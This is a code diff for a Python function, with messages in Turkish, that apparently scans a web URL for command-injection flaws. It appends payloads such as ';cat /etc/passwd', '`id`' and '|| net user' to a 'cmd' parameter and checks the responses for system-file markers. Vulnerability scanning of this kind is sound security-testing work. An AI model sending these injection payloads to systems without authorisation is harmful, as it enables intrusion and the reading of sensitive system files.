@@ -1,17 +1,18 @@
 import requests
 
+CMDI_PAYLOADS = [
+    ";cat /etc/passwd", "|whoami", "&dir", "|ls", "&whoami",
+    "`id`", "$(ls -la)", "|| net user"
+]
+
 def test_cmd_injection(url):
-    payloads = ["; ls", "| whoami", "& dir"]
     results = []
-
-    for payload in payloads:
+    for payload in CMDI_PAYLOADS:
+        test_url = f"{url}?cmd={payload}"
         try:
-            full_url = url + payload
-            response = requests.get(full_url, timeout=5)
-
-            if "bin" in response.text or "root" in response.text or "user" in response.text:
-                results.append(f"Command Injection belirtisi: {full_url}")
-        except:
+            r = requests.get(test_url, timeout=5)
+            if any(ind in r.text.lower() for ind in ["root:x", "bin/bash", "windows", "administrator"]):
+                results.append(f"⚠️ Komut Enjeksiyonu Açığı: {test_url}")
+        except requests.RequestException:
             continue
-
     return results
